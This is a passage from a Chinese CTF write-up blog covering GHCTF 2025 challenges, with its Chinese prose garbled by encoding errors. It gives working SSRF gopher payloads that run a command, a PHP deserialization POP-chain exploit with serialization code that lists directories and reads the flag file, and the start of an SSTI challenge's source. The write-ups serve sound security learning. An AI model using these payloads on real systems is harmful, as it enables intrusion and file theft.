<h4 id="ç¬¬äºŒç§ï¼š"><a href="#ç¬¬äºŒç§ï¼š" class="headerlink" title="ç¬¬äºŒç§ï¼š"></a>ç¬¬äºŒç§ï¼š</h4><p>æˆ‘ä»¬çš„URLåœ°å€ä¸èƒ½åŒ…å«127.0.0.1ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è¯´åœ°å€ä¸èƒ½åŒ…å«å…¶å®ƒçš„127çš„åœ°å€å‘€</p>
<p>ä¹Ÿå°±æ˜¯æ‰€æœ‰ä»¥127å¼€å¤´çš„æœ¬åœ°å›ç¯åœ°å€éƒ½å¯ä»¥ä½œä¸ºå‘é€çš„URLåœ°å€</p>
<p>è¿™é‡Œæˆ‘å°±é‡‡ç”¨ç¬¬äºŒç§æ–¹æ³•</p>
<p>æ„é€ ä¸€ä¸ªGopher URLï¼Œå‘é€çš„æ•°æ®ä»¥POSTè¯·æ±‚åˆ°127.0.0.1:8000&#x2F;Manageï¼Œå¹¶æºå¸¦cmdå‚æ•°</p>
<p>æœ‰ç‚¹ç»•ï¼Œé‡æ–°æ¢³ç†ä¸€ä¸‹</p>
<ul>
<li>&#x2F;Manageè·¯ç”±çš„POSTè¯·æ±‚å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†å¿…é¡»remote_addræ˜¯127.0.0.1ã€‚</li>
<li>&#x2F;Gopherè·¯ç”±å­˜åœ¨SSRFï¼Œä½†æ— æ³•å‘é€POSTè¯·æ±‚ï¼Œå¹¶ä¸”å½“è¿æ¥åˆ°127.0.0.1æ—¶ä¼šè¢«è¿‡æ»¤ã€‚</li>
</ul>
<p>é‚£ä¹ˆç¬¬ä¸€æ­¥ï¼Œé¦–å…ˆæ„é€ Gopher URL</p>
<pre><code class="language-python">http://node6.anna.nssctf.cn:24175/Manage
</code></pre>
<p>å¹¶ä¸”POSTå‘åŒ…ï¼Œå‘é€cmdå‚æ•°</p>
<pre><code class="language-python">cmd=env
</code></pre>
<p>å®Œæ•´çš„è¯·æ±‚ä¸º</p>
<pre><code class="language-python">POST /Manage HTTP/1.1
host:127.0.0.1
Content-Type:application/x-www-form-urlencoded
Content-Length:7

cmd=env
</code></pre>
<p>ç¬¬äºŒæ­¥ï¼Œ<font style="color:rgb(64, 64, 64);">å°†æ„é€ çš„Gopher URLä½œä¸ºå‚æ•°å‘é€åˆ°</font><code>&lt;font style=&quot;color:rgb(64, 64, 64);&quot;&gt;/Gopher&lt;/font&gt;</code><font style="color:rgb(64, 64, 64);">è·¯ç”±</font></p>
<p><font style="color:rgb(64, 64, 64);">å°†ä¸Šé¢çš„å®Œæ•´è¯·æ±‚è½¬åŒ–ä¸ºå‚æ•°ï¼Œç»è¿‡ä¸¤æ¬¡urlè½¬ç </font></p>
<p><font style="color:rgb(64, 64, 64);">å˜ä¸º</font></p>
<pre><code class="language-python">POST%2520%252FManage%2520HTTP%252
F1.1%250Ahost%253A127.0.0.1%250AContent-Type%253Aapplication%252Fx-www-for
m-urlencoded%250AContent-Length%253A7%250A%250Acmd%253Denv
</code></pre>
<p>æŠŠå‚æ•°å’Œ127.0.0.2:8000è¿›è¡Œæ‹¼æ¥ï¼ˆé»‘åå•è¿‡æ»¤äº†127.0.0.1æ‰€ä»¥ç”¨127.0.0.2ï¼‰</p>
<pre><code class="language-python">/Gopher?url=gopher://127.0.0.2:8000/_POST%2520%252FManage%2520HTTP%252
F1.1%250Ahost%253A127.0.0.1%250AContent-Type%253Aapplication%252Fx-www-for
m-urlencoded%250AContent-Length%253A7%250A%250Acmd%253Denv
</code></pre>
<p>å‘åŒ…<br><img src="1741610144938-0392732d-640c-46c4-82ae-faa92ef1606e.png" loading="lazy"></p>
<p>æˆåŠŸè·å–flag</p>
<p><font style="color:rgb(0, 0, 0);">NSSCTF{5631b4f8-a764-40a0-acf7-cb05bcd40a00}</font></p>
<p>ä¸ºä»€ä¹ˆç”¨envå‘½ä»¤</p>
<p>å…¶å®ƒå‚æ•°ä¹Ÿè¯•è¿‡ä½†æ²¡æœ‰æ‰¾åˆ°flag,è°ä¼šæƒ³åˆ°å®ƒè—åœ¨äº†ç¯å¢ƒå½“ä¸­å•ŠğŸ’”</p>
<h1 id="GHCTF-2025-Popppppp"><a href="#GHCTF-2025-Popppppp" class="headerlink" title="[GHCTF 2025]Popppppp"></a>[GHCTF 2025]Popppppp</h1><h2 id="é¢˜ç›®é“¾æ¥-3"><a href="#é¢˜ç›®é“¾æ¥-3" class="headerlink" title="é¢˜ç›®é“¾æ¥"></a>é¢˜ç›®é“¾æ¥</h2><p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/6591">https://www.nssctf.cn/problem/6591</a></p>
<h2 id="é¢˜è§£ï¼ˆwpï¼‰-1"><a href="#é¢˜è§£ï¼ˆwpï¼‰-1" class="headerlink" title="é¢˜è§£ï¼ˆwpï¼‰"></a>é¢˜è§£ï¼ˆwpï¼‰</h2><p>æ‰“å¼€é¢˜ç›®</p>
<p><img src="1741761056352-81310bcb-a890-4f4a-940c-a141425541a6.png" loading="lazy"></p>
<pre><code class="language-php">&lt;?php
error_reporting(0);

class CherryBlossom &#123;
    public $fruit1;
    public $fruit2;

    public function __construct($a) &#123;
        $this-&gt;fruit1 = $a;
    &#125;

    function __destruct() &#123;
        echo $this-&gt;fruit1;
    &#125;

    public function __toString() &#123;
        $newFunc = $this-&gt;fruit2;
        return $newFunc();
    &#125;
&#125;

class Forbidden &#123;
    private $fruit3;

    public function __construct($string) &#123;
        $this-&gt;fruit3 = $string;
    &#125;

    public function __get($name) &#123;
        $var = $this-&gt;$name;
        $var[$name]();
    &#125;
&#125;

class Warlord &#123;
    public $fruit4;
    public $fruit5;
    public $arg1;

    public function __call($arg1, $arg2) &#123;
        $function = $this-&gt;fruit4;
        return $function();
    &#125;

    public function __get($arg1) &#123;
        $this-&gt;fruit5-&gt;ll2(&#39;b2&#39;);
    &#125;
&#125;

class Samurai &#123;
    public $fruit6;
    public $fruit7;

    public function __toString() &#123;
        $long = @$this-&gt;fruit6-&gt;add();
        return $long;
    &#125;

    public function __set($arg1, $arg2) &#123;
        if ($this-&gt;fruit7-&gt;tt2) &#123;
            echo &quot;xxx are the best!!!&quot;;
        &#125;
    &#125;
&#125;

class Mystery &#123;

    public function __get($arg1) &#123;
        array_walk($this, function ($day1, $day2) &#123;
            $day3 = new $day2($day1);
            foreach ($day3 as $day4) &#123;
                echo ($day4 . &#39;&lt;br&gt;&#39;);
            &#125;
        &#125;);
    &#125;
&#125;

class Princess &#123;
    protected $fruit9;

    protected function addMe() &#123;
        return &quot;The time spent with xxx is my happiest time&quot; . $this-&gt;fruit9;
    &#125;

    public function __call($func, $args) &#123;
        call_user_func([$this, $func . &quot;Me&quot;], $args);
    &#125;
&#125;

class Philosopher &#123;
    public $fruit10;
    public $fruit11=&quot;sr22kaDugamdwTPhG5zU&quot;;

    public function __invoke() &#123;
        if (md5(md5($this-&gt;fruit11)) == 666) &#123;
            return $this-&gt;fruit10-&gt;hey;
        &#125;
    &#125;
&#125;

class UselessTwo &#123;
    public $hiddenVar = &quot;123123&quot;;

    public function __construct($value) &#123;
        $this-&gt;hiddenVar = $value;
    &#125;

    public function __toString() &#123;
        return $this-&gt;hiddenVar;
    &#125;
&#125;

class Warrior &#123;
    public $fruit12;
    private $fruit13;

    public function __set($name, $value) &#123;
        $this-&gt;$name = $value;
        if ($this-&gt;fruit13 == &quot;xxx&quot;) &#123;
            strtolower($this-&gt;fruit12);
        &#125;
    &#125;
&#125;

class UselessThree &#123;
    public $dummyVar;

    public function __call($name, $args) &#123;
        return $name;
    &#125;
&#125;

class UselessFour &#123;
    public $lalala;

    public function __destruct() &#123;
        echo &quot;Hehe&quot;;
    &#125;
&#125;

if (isset($_GET[&#39;GHCTF&#39;])) &#123;
    unserialize($_GET[&#39;GHCTF&#39;]);
&#125; else &#123;
    highlight_file(__FILE__);
&#125;
</code></pre>
<p>ç›´æ¥çœ‹æœ€åæœ‰æ¥æ”¶å‚æ•°ï¼Œå¹¶ä¸”è¿›è¡Œååºåˆ—åŒ–</p>
<p>okï¼Œå¤ªé•¿ğŸ˜±ï¼Œä¸åšäº†</p>
<p><img src="1741769819330-d1c32618-88ed-4166-8867-5241558bb9d7.jpeg" loading="lazy"></p>
<p>è¯¥æ¥çš„è¿˜æ˜¯ä¼šæ¥çš„</p>
<p>é¦–å…ˆå¯ä»¥ç¡®è®¤çš„æ˜¯<font style="color:rgb(38,38,38);">ä¸€é“popé“¾æ„é€ ï¼Œå¹¶ä¸”è¦æ‰¾åˆ°â¼€æ•´æ¡é“¾â¼¦çš„æ„é€ </font>ï¼Œ</p>
<p>é‚£ä¹ˆå°±è¦æ‰¾åˆ°é“¾å°¾ï¼ˆå°±æ˜¯æ‰§è¡Œæ¶æ„ä»£ç çš„åœ°æ–¹ï¼‰</p>
<p>åˆ†æè¿™äº›ç±»éƒ½æ˜¯å¹²å•¥çš„</p>
<ol>
<li><strong>CherryBlossom</strong>ç±»ï¼š</li>
</ol>
<ul>
<li><code>__destruct()</code>æ–¹æ³•ä¼šè¾“å‡º<code>fruit1</code>ï¼Œå¦‚æœ<code>fruit1</code>æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå¯èƒ½ä¼šè§¦å‘å…¶<code>__toString()</code>æ–¹æ³•ã€‚</li>
<li><code>__toString()</code>æ–¹æ³•ä¼šè°ƒç”¨<code>fruit2</code>ä½œä¸ºå‡½æ•°ï¼Œæ‰€ä»¥å¦‚æœ<code>fruit2</code>æ˜¯ä¸€ä¸ªå¯è°ƒç”¨çš„å¯¹è±¡ï¼ˆæ¯”å¦‚æœ‰<code>__invoke()</code>æ–¹æ³•ï¼‰ï¼Œå°±ä¼šè§¦å‘ã€‚</li>
</ul>
<pre><code class="language-php">class CherryBlossom &#123;
    public $fruit1;
    public $fruit2;

    public function __construct($a) &#123;
        $this-&gt;fruit1 = $a;
    &#125;

    function __destruct() &#123;
        echo $this-&gt;fruit1;
    &#125;

    public function __toString() &#123;
        $newFunc = $this-&gt;fruit2;
        return $newFunc();
    &#125;
&#125;
</code></pre>
<ol start="2">
<li><strong>Forbidden</strong>ç±»ï¼š</li>
</ol>
<ul>
<li><code>__get()</code>æ–¹æ³•ä¼šå°è¯•è°ƒç”¨<code>$var[$name]()</code>ã€‚è¿™é‡Œå¦‚æœ<code>$var</code>æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå¹¶ä¸”æŸä¸ªé”®å¯¹åº”çš„æ–¹æ³•å­˜åœ¨ï¼Œå¯èƒ½ä¼šè¢«è°ƒç”¨ã€‚</li>
</ul>
<ol start="3">
<li><strong>Warlord</strong>ç±»ï¼š</li>
</ol>
<ul>
<li><code>__call()</code>æ–¹æ³•ä¼šè°ƒç”¨<code>fruit4</code>ä½œä¸ºå‡½æ•°ã€‚</li>
<li><code>__get()</code>æ–¹æ³•ä¼šè°ƒç”¨<code>fruit5-&gt;ll2(&#39;b2&#39;)</code>ï¼Œå¦‚æœ<code>fruit5</code>æœ‰<code>ll2</code>æ–¹æ³•çš„è¯ã€‚</li>
</ul>
<ol start="4">
<li><strong>Samurai</strong>ç±»ï¼š</li>
</ol>
<ul>
<li><code>__toString()</code>æ–¹æ³•è°ƒç”¨<code>fruit6-&gt;add()</code>ï¼Œå¦‚æœ<code>fruit6</code>æœ‰<code>add()</code>æ–¹æ³•çš„è¯ã€‚</li>
<li><code>__set()</code>æ–¹æ³•æ£€æŸ¥<code>fruit7-&gt;tt2</code>æ˜¯å¦ä¸ºçœŸï¼Œå¯èƒ½è§¦å‘<code>__get()</code>ã€‚</li>
</ul>
<ol start="5">
<li><strong>Mystery</strong>ç±»ï¼š</li>
</ol>
<ul>
<li><code>__get()</code>æ–¹æ³•ä½¿ç”¨<code>array_walk</code>éå†è‡ªèº«å±æ€§ï¼Œå¯èƒ½ä¼šå®ä¾‹åŒ–æŸäº›ç±»å¹¶è¾“å‡ºå†…å®¹ã€‚</li>
</ul>
<ol start="6">
<li><strong>Princess</strong>ç±»ï¼š</li>
</ol>
<ul>
<li><code>__call()</code>æ–¹æ³•ä¼šå°è¯•è°ƒç”¨<code>addMe()</code>ï¼Œä½†ä¼¼ä¹æ²¡æœ‰æ˜æ˜¾çš„å±é™©æ“ä½œã€‚</li>
</ul>
<ol start="7">
<li><strong>Philosopher</strong>ç±»ï¼š</li>
</ol>
<ul>
<li><code>__invoke()</code>æ–¹æ³•åœ¨å¯¹è±¡è¢«å½“ä½œå‡½æ•°è°ƒç”¨æ—¶è§¦å‘ã€‚è¿™é‡Œæ£€æŸ¥<code>md5(md5($this-&gt;fruit11)) == 666</code>ï¼Œå¦‚æœæ»¡è¶³ï¼Œè¿”å›<code>fruit10-&gt;hey</code>ã€‚éœ€è¦æ‰¾åˆ°<code>fruit11</code>çš„å€¼ä½¿å¾—åŒé‡MD5ç­‰äº666ï¼Œä½†çœ‹èµ·æ¥<code>fruit11</code>é»˜è®¤æ˜¯â€sr22kaDugamdwTPhG5zUâ€ï¼Œå¯èƒ½éœ€è¦è¦†ç›–å®ƒã€‚</li>
</ul>
<ol start="8">
<li><strong>UselessTwo</strong>ç±»ï¼š</li>
</ol>
<ul>
<li>ç®€å•çš„<code>__toString()</code>ï¼Œè¿”å›éšè—å˜é‡ã€‚</li>
</ul>
<ol start="9">
<li><strong>Warrior</strong>ç±»ï¼š</li>
</ol>
<ul>
<li><code>__set()</code>æ–¹æ³•åœ¨è®¾ç½®å±æ€§æ—¶è§¦å‘ï¼Œå¯èƒ½é€šè¿‡<code>strtolower</code>è§¦å‘å…¶ä»–æ“ä½œã€‚</li>
</ul>
<p>é‚£ä¹ˆé“¾å°¾å°±æ˜äº†äº†ï¼Œå°±æ˜¯Samuraiç±»çš„_get()æ–¹æ³•</p>
<p>ä½†æ˜¯è¯¥å¦‚ä½•è§¦å‘è¿™_getæ–¹æ³•å‘¢ï¼Ÿ</p>
<p><font style="color:rgb(38,38,38);">åœ¨ä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®æˆ–è€…ä¸å­˜åœ¨è¿™ä¸ªé”®éƒ½ä¼šè°ƒâ½¤ __get() â½…æ³•ã€‚ </font></p>
<p><font style="color:rgb(38,38,38);">æ­¤æ—¶æˆ‘ä»¬å‘ç°åœ¨ </font><font style="color:rgb(38,38,38);background-color:#D8DAD9;">Philosopher</font><font style="color:rgb(38,38,38);"> è¿™ä¸ªç±»ä¸­å­˜åœ¨è®¿é—®ä¸å­˜åœ¨çš„é”®å€¼ key è¿™ä¸ªæ“ä½œï¼Œâ¾ƒç„¶å°±ä¼šè§¦å‘ _ </font></p>
<p><font style="color:rgb(38,38,38);">_</font><font style="color:rgb(38,38,38);background-color:#D8DAD9;">get(</font><font style="color:rgb(38,38,38);">) å‡½æ•°</font></p>
<p><img src="1742031281304-2487266d-0f2b-4338-ae73-f4e4a808f0fa.png" loading="lazy"></p>
<p><font style="color:rgb(38,38,38);">æˆ‘ä»¬å‘ç°è¯¥å‡½æ•°æ˜¯é­”æœ¯é­”â½… </font><font style="color:rgb(38,38,38);background-color:#D8DAD9;">__invoke()</font><font style="color:rgb(38,38,38);"> ï¼›é‚£ä¹ˆæˆ‘ä»¬å°±ç»§ç»­æƒ³å¦‚ä½•æ‰èƒ½è§¦å‘è¿™ä¸ª</font><font style="color:rgb(38,38,38);background-color:#D8DAD9;"> __invoke()</font><font style="color:rgb(38,38,38);"> å‡½æ•° </font></p>
<p><font style="color:rgb(38,38,38);">å‘¢ï¼Ÿå½“å°è¯•å°†å¯¹è±¡è°ƒâ½¤ä¸ºå‡½æ•°æ—¶è§¦å‘ </font><font style="color:rgb(38,38,38);background-color:#D8DAD9;">__invoke()</font><font style="color:rgb(38,38,38);"> ã€‚æ‰€ä»¥æ­¤æ—¶æˆ‘ä»¬å°±éœ€è¦å¯»æ‰¾æœ‰å“ªä¸ªå¯¹è±¡è¢«å½“ä½œå‡½æ•° </font></p>
<p><font style="color:rgb(38,38,38);">è¿›â¾è°ƒâ½¤äº†ã€‚ </font></p>
<p><font style="color:rgb(38,38,38);">æˆ‘ä»¬ç»§ç»­è¿›â¾æºç å®¡è®¡å‘ç°åœ¨ </font><font style="color:rgb(38,38,38);background-color:#D8DAD9;">Warlord</font><font style="color:rgb(38,38,38);"> è¿™ä¸ªç±»ä¸­å‡ºç°äº†å°†å¯¹è±¡è°ƒâ½¤ä¸ºå‡½æ•°çš„æ“ä½œï¼š</font></p>
<p><img src="1742031305284-a6979849-3d9e-4527-9819-96775689e1f3.png" loading="lazy"></p>
<p><font style="color:rgb(38,38,38);">æˆ‘ä»¬è§‚å¯Ÿåˆ°è¯¥å‡½æ•°ä¸ºé­”æœ¯é­”â½…</font><font style="color:rgb(38,38,38);background-color:#D8DAD9;"> _call() </font><font style="color:rgb(38,38,38);">ï¼›é‚£ä¹ˆæˆ‘ä»¬å°±ç»§ç»­æƒ³å¦‚ä½•æ‰èƒ½è§¦å‘è¿™ä¸ª </font><font style="color:rgb(38,38,38);background-color:#D8DAD9;">__call()</font><font style="color:rgb(38,38,38);"> ï¼›åœ¨å¯¹è±¡ </font></p>
<p><font style="color:rgb(38,38,38);">ä¸Šä¸‹â½‚ä¸­è°ƒâ½¤ä¸å¯è®¿é—®çš„â½…æ³•æˆ–ä¸å­˜åœ¨çš„â½…æ³•æ—¶è§¦å‘ </font><font style="color:rgb(38,38,38);background-color:#D8DAD9;">__call()</font><font style="color:rgb(38,38,38);"> ã€‚ </font></p>
<p><font style="color:rgb(89,89,89);">34</font><font style="color:rgb(38,38,38);">å†æ¥ç€æºç å®¡è®¡å¯ä»¥çœ‹åˆ°åœ¨ Samurai è¿™ä¸ªç±»ä¸­å‡ºç°äº†ä¸å¯è®¿é—®çš„â½…æ³• </font><font style="color:rgb(38,38,38);background-color:#D8DAD9;">add()</font><font style="color:rgb(38,38,38);"> ï¼›æ­¤æ—¶â¾ƒç„¶å°±ä¼šè§¦ </font></p>
<p><font style="color:rgb(38,38,38);">å‘ </font><font style="color:rgb(38,38,38);background-color:#D8DAD9;">__call()</font><font style="color:rgb(38,38,38);"> å‡½æ•°ã€‚</font></p>
<p><img src="1742031448186-1a669cac-ae88-40ac-a827-ad32cc1ed2e6.png" loading="lazy"></p>
<p>æˆ‘ä»¬è§‚å¯Ÿåˆ°è¯¥å‡½æ•°ä¸ºé­”æœ¯é­”â½… __toString() ï¼›é‚£ä¹ˆæˆ‘ä»¬å°±ç»§ç»­æƒ³å¦‚ä½•æ‰èƒ½è§¦å‘è¿™ä¸ª __toString</p>
<p>() å‡½æ•°å‘¢ï¼Ÿåœ¨å°†å¯¹è±¡å½“ä½œå­—ç¬¦ä¸²ä½¿â½¤æ—¶å°±ä¼šè§¦å‘ __toStringï¼ˆï¼‰ ï¼›æ‰€ä»¥æ­¤æ—¶æˆ‘ä»¬å°±éœ€è¦å¯»æ‰¾æœ‰å“ªä¸ª</p>
<p>å¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²è¿›â¾è°ƒâ½¤äº†ã€‚</p>
<p>ç»§ç»­å®¡è®¡å‘ç°åœ¨ CherryBlossom ç±»ä¸­å‡ºç°äº†å°†å¯¹è±¡ fruit1 å½“ä½œå­—ç¬¦ä¸²è¿›â¾ä½¿â½¤çš„æ“ä½œ</p>
<p><img src="1742031483342-cd42b4ab-acdb-4345-a057-9801056265e0.png" loading="lazy"></p>
<p><font style="color:rgb(38,38,38);">â¾„æ­¤æ•´æ¡popé“¾å·²ç»â¾®å¸¸çš„æ¸…æ™°äº†</font></p>
<pre><code class="language-php">__destruct -&gt; __toString -&gt; __call -&gt;__invoke() -&gt;__get
</code></pre>
<p><font style="color:rgb(38,38,38);">ä¹Ÿå°±æ˜¯</font></p>
<pre><code class="language-php">CherryBlossom&#123;__destruct()&#125; --&gt; Samurai&#123;__toString()&#125; --&gt; Warlord&#123;__call
()&#125; --&gt; Philosopher&#123;__invoke()&#125; --&gt; Mystery&#123;__get()&#125;
</code></pre>
<p><font style="color:rgb(38,38,38);">ä½†æ˜¯æ­¤æ—¶æˆ‘ä»¬å‘ç°è¦å®ç°è¿™â¼€æ•´æ¡ pop é“¾è¿˜æœ‰â¼€æ­¥æ²¡æœ‰ç»•è¿‡ï¼›æˆ‘ä»¬å‘ç°åœ¨æœ€åâ¼€æ­¥ </font><font style="color:rgb(38,38,38);">__get() </font><font style="color:rgb(38,38,38);">å‡½æ•°çš„è§¦ </font></p>
<p><font style="color:rgb(38,38,38);">å‘æ—¶éœ€è¦æ»¡â¾œã€‚</font></p>
<pre><code class="language-php">public function __invoke() &#123;
       if (md5(md5($this-&gt;fruit11)) == 666) &#123;
           return $this-&gt;fruit10-&gt;hey;
       &#125;
 &#125;
</code></pre>
<h3 id="åŒé‡MD5"><a href="#åŒé‡MD5" class="headerlink" title="åŒé‡MD5"></a>åŒé‡MD5</h3><p><font style="color:rgb(38,38,38);">æ­¤æ—¶åˆ©â½¤åˆ°çš„æ˜¯åŒé‡md5ç»•è¿‡ï¼š </font></p>
<pre><code class="language-python"># -*- coding: utf-8 -*-
# è¿â¾: python2 md5.py &quot;666&quot; 0
import multiprocessing
import hashlib
import random
import string
import sys
CHARS = string.ascii_letters + string.digits
def cmp_md5(substr, stop_event, str_len, start=0, size=20):
    global CHARS
    while not stop_event.is_set():
        rnds = &#39;&#39;.join(random.choice(CHARS) for _ in range(size))
    md5 = hashlib.md5(rnds)
    value = md5.hexdigest()
    if value[start: start + str_len] == substr:
        # print rnds
        # stop_event.set()
    # ç¢°æ’åŒmd5
        md5 = hashlib.md5(value)
    if md5.hexdigest()[start: start + str_len] == substr:
        print rnds + &quot;=&gt;&quot; + value + &quot;=&gt;&quot; + md5.hexdigest() + &quot;\n&quot;
    stop_event.set()
if __name__ == &#39;__main__&#39;:
    substr = sys.argv[1].strip()
    start_pos = int(sys.argv[2]) if len(sys.argv) &gt; 1 else 0
    str_len = len(substr)
    cpus = multiprocessing.cpu_count()
    stop_event = multiprocessing.Event()
    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,
                                                               stop_event,
                                                               str_len, start_pos))
                 for i in range(cpus)]
    for p in processes:
        p.start()
    for p in processes:
        p.join()
</code></pre>
<h3 id="ååºåˆ—åŒ–ä¹‹éå†â½‚ä»¶â½¬å½•ç±»"><a href="#ååºåˆ—åŒ–ä¹‹éå†â½‚ä»¶â½¬å½•ç±»" class="headerlink" title="ååºåˆ—åŒ–ä¹‹éå†â½‚ä»¶â½¬å½•ç±»"></a>ååºåˆ—åŒ–ä¹‹éå†â½‚ä»¶â½¬å½•ç±»</h3><pre><code class="language-php">&lt;?php
  error_reporting(0);
class CherryBlossom
&#123;
  public $fruit1;
  public $fruit2;
  function __destruct()
  &#123;
    echo $this-&gt;fruit1;
  &#125;
  public function __toString()
  &#123;
    $newFunc = $this-&gt;fruit2;
    return $newFunc();
  &#125;
&#125;
class Mystery
&#123;
  public $GlobIterator=&quot;/*&quot;;
  public function __get($arg1)
  &#123;
    array_walk($this, function ($day1, $day2) &#123;
      $day3 = new $day2($day1);
      foreach ($day3 as $day4) &#123;
        echo($day4 . &#39;&lt;br&gt;&#39;);
      &#125;
    &#125;);
  &#125;
&#125;
class Philosopher
&#123;
  public $fruit10;
public $fruit11=&quot;rSYwGEnSLmJWWqkEARJp&quot;;
public function __invoke()
  &#123;
    if (md5(md5($this-&gt;fruit11)) == 666) &#123;
      return $this-&gt;fruit10-&gt;hey;
    &#125;
  &#125;
&#125;
$b=new CherryBlossom();
$b-&gt;fruit1=new CherryBlossom();
$b-&gt;fruit1-&gt;fruit2=new Philosopher();
$b-&gt;fruit1-&gt;fruit2-&gt;fruit10=new Mystery();
$c=serialize($b);
echo $c;
</code></pre>
<p><img src="1742031823033-c13c1bc4-6f2d-47eb-987a-7686d5fdf237.png" loading="lazy"></p>
<p><img src="1741762974733-00c8656f-211f-4f06-b422-88175970fc47.png" loading="lazy"></p>
<p>çˆ†å‡ºäº†flagçš„ä½ç½®</p>
<h3 id="ååºåˆ—åŒ–ä¹‹è¯»å–â½‚ä»¶ç±»"><a href="#ååºåˆ—åŒ–ä¹‹è¯»å–â½‚ä»¶ç±»" class="headerlink" title="ååºåˆ—åŒ–ä¹‹è¯»å–â½‚ä»¶ç±»"></a>ååºåˆ—åŒ–ä¹‹è¯»å–â½‚ä»¶ç±»</h3><p><font style="color:rgb(38,38,38);">æ­¤æ—¶æˆåŠŸéå†â½‚ä»¶â½¬å½•åæˆ‘ä»¬ç›´æ¥è¯»å–â½‚ä»¶å³å¯</font></p>
<pre><code class="language-php">&lt;?php
  error_reporting(0);
class CherryBlossom
&#123;
  public $fruit1;
  public $fruit2;
  function __destruct()
  &#123;
    echo $this-&gt;fruit1;
  &#125;
  public function __toString()
  &#123;
    $newFunc = $this-&gt;fruit2;
    return $newFunc();
  &#125;
&#125;
class Mystery
&#123;
  public $SplFileObject=&quot;/flag44545615441084&quot;;
  public function __get($arg1)
  &#123;
    array_walk($this, function ($day1, $day2) &#123;
      $day3 = new $day2($day1);
      foreach ($day3 as $day4) &#123;
        echo($day4 . &#39;&lt;br&gt;&#39;);
      &#125;
    &#125;);
  &#125;
&#125;
class Philosopher
&#123;
  public $fruit10;   
  public $fruit11=&quot;rSYwGEnSLmJWWqkEARJp&quot;;
public function __invoke()
  &#123;
    if (md5(md5($this-&gt;fruit11)) == 666) &#123;
      return $this-&gt;fruit10-&gt;hey;
    &#125;
  &#125;
&#125;
$b=new CherryBlossom();
$b-&gt;fruit1=new CherryBlossom();
$b-&gt;fruit1-&gt;fruit2=new Philosopher();
$b-&gt;fruit1-&gt;fruit2-&gt;fruit10=new Mystery();
$c=serialize($b);
echo $c;
</code></pre>
<p><img src="1741763706926-5a0492d4-930b-49b8-a737-89c8c70110bd.png" loading="lazy"></p>
<h1 id="GHCTF-2025-upload-SSTI"><a href="#GHCTF-2025-upload-SSTI" class="headerlink" title="[GHCTF 2025]upload?SSTI!"></a>[GHCTF 2025]upload?SSTI!</h1><h2 id="é¢˜ç›®é“¾æ¥-4"><a href="#é¢˜ç›®é“¾æ¥-4" class="headerlink" title="é¢˜ç›®é“¾æ¥"></a>é¢˜ç›®é“¾æ¥</h2><p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/6529">https://www.nssctf.cn/problem/6529</a></p>
<h2 id="é¢˜è§£ï¼ˆwpï¼‰-2"><a href="#é¢˜è§£ï¼ˆwpï¼‰-2" class="headerlink" title="é¢˜è§£ï¼ˆwpï¼‰"></a>é¢˜è§£ï¼ˆwpï¼‰</h2><p><font style="color:rgb(82, 95, 127);">#</font><font style="color:rgb(82, 95, 127);"> </font><font style="color:rgb(82, 95, 127);">upload?SSTI!</font></p>
<pre><code class="language-python">import os
import re

from flask import Flask, request, jsonify,render_template_string,send_from_directory, abort,redirect
from werkzeug.utils import secure_filename
import os
from werkzeug.utils import secure_filename

app = Flask(__name__)

# é…ç½®ä¿¡æ¯
UPLOAD_FOLDER = &#39;static/uploads&#39;  # ä¸Šä¼ æ–‡ä»¶ä¿å­˜ç›®å½•
ALLOWED_EXTENSIONS = &#123;&#39;txt&#39;, &#39;log&#39;, &#39;text&#39;,&#39;md&#39;,&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;&#125;
MAX_CONTENT_LENGTH = 16 * 1024 * 1024  # é™åˆ¶ä¸Šä¼ å¤§å°ä¸º 16MB

app.config[&#39;UPLOAD_FOLDER&#39;] = UPLOAD_FOLDER
app.config[&#39;MAX_CONTENT_LENGTH&#39;] = MAX_CONTENT_LENGTH

# åˆ›å»ºä¸Šä¼ ç›®å½•ï¼ˆå¦‚æœä¸å­˜åœ¨ï¼‰
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
def is_safe_path(basedir, path):
    return os.path.commonpath([basedir,path])

def contains_dangerous_keywords(file_path):
    dangerous_keywords = [&#39;_&#39;, &#39;os&#39;, &#39;subclasses&#39;, &#39;__builtins__&#39;, &#39;__globals__&#39;,&#39;flag&#39;,]

    with open(file_path, &#39;rb&#39;) as f:
        file_content = str(f.read())

        for keyword in dangerous_keywords:
            if keyword in file_content:
                return True  # æ‰¾åˆ°å±é™©å…³é”®å­—ï¼Œè¿”å› True

    return False  # æ–‡ä»¶å†…å®¹ä¸­æ²¡æœ‰å±é™©å…³é”®å­—
def allowed_file(filename):
    return &#39;.&#39; in filename and \
    filename.rsplit(&#39;.&#39;, 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def upload_file():
    if request.method == &#39;POST&#39;:
        # æ£€æŸ¥æ˜¯å¦æœ‰æ–‡ä»¶è¢«ä¸Šä¼ 
        if &#39;file&#39; not in request.files:
            return jsonify(&#123;&quot;error&quot;: &quot;æœªä¸Šä¼ æ–‡ä»¶&quot;&#125;), 400

        file = request.files[&#39;file&#39;]

        # æ£€æŸ¥æ˜¯å¦é€‰æ‹©äº†æ–‡ä»¶
        if file.filename == &#39;&#39;:
            return jsonify(&#123;&quot;error&quot;: &quot;è¯·é€‰æ‹©æ–‡ä»¶&quot;&#125;), 400

        # éªŒè¯æ–‡ä»¶åå’Œæ‰©å±•å
        if file and allowed_file(file.filename):
            # å®‰å…¨å¤„ç†æ–‡ä»¶å
            filename = secure_filename(file.filename)
            # ä¿å­˜æ–‡ä»¶
            save_path = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], filename)
            file.save(save_path)

            # è¿”å›æ–‡ä»¶è·¯å¾„ï¼ˆç»å¯¹è·¯å¾„ï¼‰
            return jsonify(&#123;
                &quot;message&quot;: &quot;File uploaded successfully&quot;,
                &quot;path&quot;: os.path.abspath(save_path)
            &#125;), 200
        else:
